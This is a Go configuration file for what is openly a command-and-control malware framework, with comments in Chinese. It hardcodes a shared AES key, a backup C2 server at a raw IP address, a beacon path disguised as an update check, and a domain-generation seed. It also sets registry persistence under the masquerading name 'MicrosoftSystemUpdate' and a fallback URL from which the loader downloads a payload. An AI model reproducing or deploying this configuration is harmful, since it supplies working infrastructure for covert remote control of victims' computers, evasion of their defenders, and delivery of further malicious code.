package config

// 全局配置常量

// AESKey 加密密钥 - Server 和 Agent 必须保持一致
var AESKey = []byte("HereIsMySecretKeyBGED56789012345") // 32 bytes

// C2 服务器配置
const (
	// BackupC2URL 保底 C2 服务器地址
	BackupC2URL = "https://38.76.199.164"

	// C2Endpoint C2 心跳接口路径
	C2Endpoint = "/api/v1/check_update"

	// ServerAddr Server 监听地址
	ServerAddr = "0.0.0.0:7899"
)

// DGA 配置
const (
	// DGASeed DGA 域名生成种子
	DGASeed = "MySeFretFeed2555"

	// DGACount DGA 生成的域名数量
	DGACount = 3
)

// Agent 持久化配置
const (
	// AppName 注册表中的应用名称
	AppName = "MicrosoftSystemUpdate"

	// ExeName 持久化后的可执行文件名
	ExeName = "sys_update.exe"
)

// Loader 配置
const (
	// FallbackPayloadURL 保底的 Payload 下载地址
	FallbackPayloadURL = "https://api.edge-cdn.top/web/payload.bin"
)
